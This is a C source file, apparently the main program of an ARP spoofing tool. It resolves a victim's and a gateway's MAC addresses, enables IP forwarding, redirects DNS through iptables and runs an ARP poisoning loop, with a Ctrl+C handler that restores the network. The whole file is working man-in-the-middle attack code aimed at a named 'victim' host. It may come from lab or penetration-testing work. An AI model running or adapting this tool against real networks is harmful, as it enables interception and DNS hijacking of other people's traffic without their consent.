#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <getopt.h>
#include <arpa/inet.h>

#include "ARP/ARP_UTILS/utils_discovery.h"
#include "ARP/ARP_UTILS/arp_scan.h"
#include "ARP/ARP_UTILS/arp_poison.h"
#include "ARP/ARP_UTILS/utils_iptables.h"

unsigned char g_victim_ip[4];
unsigned char g_victim_mac[6];
unsigned char g_gateway_ip[4];
unsigned char g_gateway_mac[6];

unsigned char *v_mac_alloc = NULL;
unsigned char *g_mac_alloc = NULL;

void handle_sigint(int sig) {
    (void)sig; // suppress unused warning
    printf("\n[SHUTDOWN] Caught SIGINT. Commencing graceful shutdown...\n");
    
    // De-poison the network cleanly
    heal_arp(g_victim_ip, g_victim_mac, g_gateway_ip, g_gateway_mac);
    
    // Revert iptables rules
    cleanup_dns_redirect();

    if (v_mac_alloc) free(v_mac_alloc);
    if (g_mac_alloc) free(g_mac_alloc);
    exit(EXIT_SUCCESS);
}

void print_hex_mac(unsigned char* mac) {
    for (int i = 0; i < 6; ++i)
        printf("%02x%c", mac[i], i == 5 ? '\n' : ':');
}

int main(int argc, char *argv[]) {
    char *victim_ip_str = NULL;
    char *gateway_ip_str = NULL;
    int opt;

    while ((opt = getopt(argc, argv, "t:g:")) != -1) {
        switch (opt) {
            case 't': victim_ip_str = optarg; break;
            case 'g': gateway_ip_str = optarg; break;
            default:
                fprintf(stderr, "Usage: %s -t <victim_ip> -g <gateway_ip>\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (!victim_ip_str || !gateway_ip_str) {
        fprintf(stderr, "Error: Missing required arguments.\n");
        fprintf(stderr, "Usage: %s -t <victim_ip> -g <gateway_ip>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    struct in_addr vic_addr, jw_addr;
    if (inet_pton(AF_INET, victim_ip_str, &vic_addr) != 1) {
        fprintf(stderr, "Invalid Target (Victim) IP format.\n");
        exit(EXIT_FAILURE);
    }
    if (inet_pton(AF_INET, gateway_ip_str, &jw_addr) != 1) {
        fprintf(stderr, "Invalid Gateway IP format.\n");
        exit(EXIT_FAILURE);
    }

    memcpy(g_victim_ip, &vic_addr.s_addr, 4);
    memcpy(g_gateway_ip, &jw_addr.s_addr, 4);

    printf("[*] Starting ARP Spoofer Engine...\n");
    
    // Resolve MACs
    v_mac_alloc = get_mac_from_ip(g_victim_ip);
    if (!v_mac_alloc) {
        fprintf(stderr, "[!] Failed to resolve Victim MAC for %s over eth0.\n", victim_ip_str);
        exit(EXIT_FAILURE);
    }
    memcpy(g_victim_mac, v_mac_alloc, 6);
    printf("[*] Discovered Victim MAC:   "); print_hex_mac(g_victim_mac);

    g_mac_alloc = get_mac_from_ip(g_gateway_ip);
    if (!g_mac_alloc) {
        fprintf(stderr, "[!] Failed to resolve Gateway MAC for %s over eth0.\n", gateway_ip_str);
        free(v_mac_alloc);
        exit(EXIT_FAILURE);
    }
    memcpy(g_gateway_mac, g_mac_alloc, 6);
    printf("[*] Discovered Gateway MAC:  "); print_hex_mac(g_gateway_mac);

    // Setup Packet Forwarding and IPTables
    printf("[*] Configuring internal packet routing...\n");
    enable_ip_forwarding();

    printf("[*] Integrating with Technitium DNS...\n");
    setup_dns_redirect();

    // Register Signal handler for graceful shutdown
    signal(SIGINT, handle_sigint);

    // Launch Loop
    printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
    printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");
    start_poisoning(g_victim_ip, g_victim_mac, g_gateway_ip, g_gateway_mac);

    // Should theoretically never reach here unless start_poisoning breaks natively
    cleanup_dns_redirect();
    if (v_mac_alloc) free(v_mac_alloc);
    if (g_mac_alloc) free(g_mac_alloc);
    
    return EXIT_SUCCESS;
}
